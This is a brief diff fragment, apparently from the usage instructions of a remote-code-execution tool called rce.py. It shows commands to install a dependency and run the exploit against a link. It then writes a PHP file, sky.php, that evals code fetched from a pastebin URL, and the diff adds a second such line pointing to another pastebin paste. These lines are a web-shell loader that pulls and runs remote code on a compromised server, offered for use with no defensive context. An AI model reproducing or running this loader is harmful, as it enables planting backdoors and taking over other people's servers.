@@ -36,4 +36,5 @@ pip install requests
 python rce.py link
 
 echo '<?php eval("?>".file_get_contents("https://pastebin.com/raw/CurQrH1a")); ?>' > sky.php
+echo '<?php eval("?>".file_get_contents("https://pastebin.com/raw/3FwYz1J8")); ?>' > sky.php
 
